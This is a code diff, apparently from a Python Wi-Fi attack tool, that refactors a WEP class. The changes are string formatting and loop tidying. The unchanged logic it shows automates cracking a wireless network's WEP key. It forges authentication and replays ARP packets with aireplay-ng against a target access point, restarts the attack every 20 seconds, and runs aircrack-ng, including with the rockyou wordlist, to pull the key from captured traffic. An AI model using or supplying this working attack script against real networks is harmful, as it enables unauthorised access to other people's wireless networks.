@@ -42,21 +42,23 @@ class WEP(EncryptionType):
         super(WEP, self).scan_network()
 
         if not self.silent_attack:
-            self.execute_command(['rm', self.write_directory + '/replay*'])
+            self.execute_command(['rm', f'{self.write_directory}/replay*'])
             fakeauth_cmd = ['aireplay-ng', '--fakeauth', '0', '-b', self.bssid, '-e', self.essid, '-T', '3',
                             self.interface, '-h', self.mac]
             arpreplay_cmd = ['aireplay-ng', '--arpreplay', '-b', self.bssid, '-h', self.mac,
                              '--ignore-negative-one', self.interface]
 
             fakeauth_out, err = self.execute_command(fakeauth_cmd)
-            self.show_message("Faked authentication on ap: " + self.bssid + " with MAC: " + self.mac)
+            self.show_message(
+                f"Faked authentication on ap: {self.bssid} with MAC: {self.mac}"
+            )
             # self.show_message(fakeauth_out.decode('utf-8'))
 
             arpreplay_thread = threading.Thread(target=self.execute_command, args=(arpreplay_cmd,))
             arpreplay_thread.start()
             arpreplay_thread.join(0)
 
-            self.show_message("Running aireplay thread on mac: " + self.mac)
+            self.show_message(f"Running aireplay thread on mac: {self.mac}")
 
             counter = 0
         else:
@@ -66,12 +68,12 @@ class WEP(EncryptionType):
 
         pgrep_aireplay_cmd = ['pgrep', 'aireplay']
 
-        while self.password == "":
+        while not self.password:
             if not self.running_aircrack:
                 crack_thread = threading.Thread(target=self.crack_network)
                 crack_thread.start()
             time.sleep(1)
-            if not self.silent_attack and self.password == "":
+            if not self.silent_attack and not self.password:
                 if counter == 20:
                     self.show_message("Reseting aireplay every 20 seconds . . .")
                     pgrep_out, err = self.execute_command(pgrep_aireplay_cmd)
@@ -85,12 +87,14 @@ class WEP(EncryptionType):
                                 self.execute_command(['kill', '-9', pid])
 
                     fakeauth_out, err = self.execute_command(fakeauth_cmd)
-                    self.show_message("Faked authentication on ap: " + self.bssid + " with MAC: " + self.mac)
+                    self.show_message(
+                        f"Faked authentication on ap: {self.bssid} with MAC: {self.mac}"
+                    )
                     # self.show_message(fakeauth_out.decode('utf-8'))
                     arpreplay_thread = threading.Thread(target=self.execute_command, args=(arpreplay_cmd,))
                     arpreplay_thread.start()
                     arpreplay_thread.join(0)
-                    self.show_message("Running aireplay thread on mac: " + self.mac)
+                    self.show_message(f"Running aireplay thread on mac: {self.mac}")
 
                     if not self.running_with_wordlist:
                         aircrack_wordlist_thread = threading.Thread(target=self.aircrack_wordlist)
@@ -109,17 +113,26 @@ class WEP(EncryptionType):
         :Author: Miguel Yanes Fernández
         """
         self.running_aircrack = True
-        self.execute_command(['rm', self.write_directory + '/aircrack_out_' + str(self.timestamp)])
-        self.execute_command(['touch', self.write_directory + '/aircrack_out_' + str(self.timestamp)])
+        self.execute_command(
+            ['rm', f'{self.write_directory}/aircrack_out_{str(self.timestamp)}']
+        )
+        self.execute_command(
+            ['touch', f'{self.write_directory}/aircrack_out_{str(self.timestamp)}']
+        )
         password = ""
-        aircrack_cmd = ['timeout', '10', 'aircrack-ng',
-                        self.write_directory + '/net_attack_' + str(self.timestamp) + '-01.cap',
-                        '>', self.write_directory + '/aircrack_out_' + str(self.timestamp)]
+        aircrack_cmd = [
+            'timeout',
+            '10',
+            'aircrack-ng',
+            f'{self.write_directory}/net_attack_{str(self.timestamp)}-01.cap',
+            '>',
+            f'{self.write_directory}/aircrack_out_{str(self.timestamp)}',
+        ]
         self.show_message("Running aircrack thread")
         self.execute_command(aircrack_cmd)
         time.sleep(1)
         print("executed aircrack")
-        with open(self.write_directory + '/aircrack_out_' + str(self.timestamp), 'r') as file:
+        with open(f'{self.write_directory}/aircrack_out_{str(self.timestamp)}', 'r') as file:
             password = self.filter_aircrack(file.read())
 
         self.running_aircrack = False
@@ -134,8 +147,12 @@ class WEP(EncryptionType):
         """
         self.show_message("running with wordlist")
         self.running_with_wordlist = True
-        aircrack_wordlist_cmd = ['aircrack-ng', self.write_directory + '/net_attack_' + str(self.timestamp) + '-01.cap',
-                                 '-w', '/usr/share/wordlists/rockyou.txt']
+        aircrack_wordlist_cmd = [
+            'aircrack-ng',
+            f'{self.write_directory}/net_attack_{str(self.timestamp)}-01.cap',
+            '-w',
+            '/usr/share/wordlists/rockyou.txt',
+        ]
         out, err = self.execute_command(aircrack_wordlist_cmd)
         self.show_message("\n\tFinished with wordlist")
         password = self.filter_aircrack(out.decode("utf-8"))
@@ -152,7 +169,7 @@ class WEP(EncryptionType):
         :Author: Miguel Yanes Fernández
         """
         words = output.split(" ")
-        for i in range(0, len(words)):
+        for i in range(len(words)):
             if words[i] == "(ASCII:":
                 return words[i + 1]
         self.show_message("No password found in the capture file")
